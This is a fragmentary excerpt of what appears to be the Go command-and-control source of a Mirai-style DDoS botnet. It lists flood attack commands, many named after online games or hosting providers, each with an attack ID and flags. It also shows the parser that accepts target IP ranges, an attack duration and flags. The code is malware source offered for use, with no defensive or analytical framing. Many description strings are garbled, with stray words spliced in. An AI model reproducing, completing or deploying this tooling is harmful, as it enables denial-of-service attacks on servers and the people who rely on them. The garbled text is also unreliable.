...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    ...
    "killallv5": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "<ip> <tkillv5ime> 23",
    },
    "killallv3": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "<ip> <time> V323",
    },
    ...
    "r6-slap": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine TCP Flood 3",
    },
    "mw-drop": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine TCP Flood 33",
    },
    "cold-war": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine TVSECP Flood 3",
    },
    "ark-255": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine TCP F255lood 3",
    },
    "among-us": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine TCP Flood 31",
    },
    "apex-dc": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine TCP Flood 36666",
    },
    "pubg-pump": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine TCP Flood 3",
    },
    "forza-4": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Sourceforza Engine TCP Flood 3",
    },
    "destiny": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source destinyEngine TCP Flood 3",
    },
    "home-xxx": AttackInfo {
        2,
    ...
    "udp-kill": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine TCP Flood 7",
    },
    "nfo-uzi": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
    ...
    "nfo-vol": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUZIx Floovolfloodd",
    },
    "nfo-ghetto": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUZghettoIx Flood",
    },
    "nfo-17": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUxxxtentacionZIx Flood",
    },
    "nfo-kill": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/hekillUZIx Flood",
    },
    "hydra-syn": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUZIHYDRAx Flood",
    },
    "tcphex": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUZIHYDRAxtcphex Flood",
     },
    "ethera": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUZIHYDetheraRAx Flood",
    },
    "osiris": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUZIHYosirisDetheraRAx Flood",
    },
    "gunther": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUZIHYDetguntherheraRAx Flood",
    },
    "nfo-fall": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUDPPLAINUZIHYDetguntherheraRAx Flood",
    },
    "massacre": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUZIHmassYDetheraRAx Flood",
    },
    "invera": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUZIHmassYDetINVERAheraRAx Flood",
    },
    "cyrus": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD/heUZIHmassYDecyrustheraRAx Flood",
    },
    "dns-pump": AttackInfo {
        2,
        []uint8 { 2, 3, 4, 5, 6, 7, 8, 9 },
    ...
    "webserver": AttackInfo {
        16,
        []uint8 {0, 1, 7},
        "randhex Flood",
    },
    "kpaxxxxxxc": AttackInfo {
        16,
        []uint8 {0, 1, 7},
        "gang",
    },
...
func NewAttack(str string, admin int) (*Attack, error) {
    ...
    if len(args) == 0 {
        ...
        if args[0] == "?" {
            validCmdList := "\033[0m Available attack list\r\n\033[0m"
        ...
        if !exists {
            return nil, errors.New(fmt.Sprintf("\033[35m %s \033[31mis not a valid command!", args[0]))
        }
    ...
    if len(args) == 0 {
        ...
        if args[0] == "?" {
            return nil, errors.New("\033[0mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
        }
    ...
    if len(args) == 0 {
        ...
        if args[0] == "?" {
            return nil, errors.New("\033[0m Duration of the attack, in seconds")
        }
    ...
    for len(args) > 0 {
        if args[0] == "flags" {
            validFlags := "\033[0m List of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
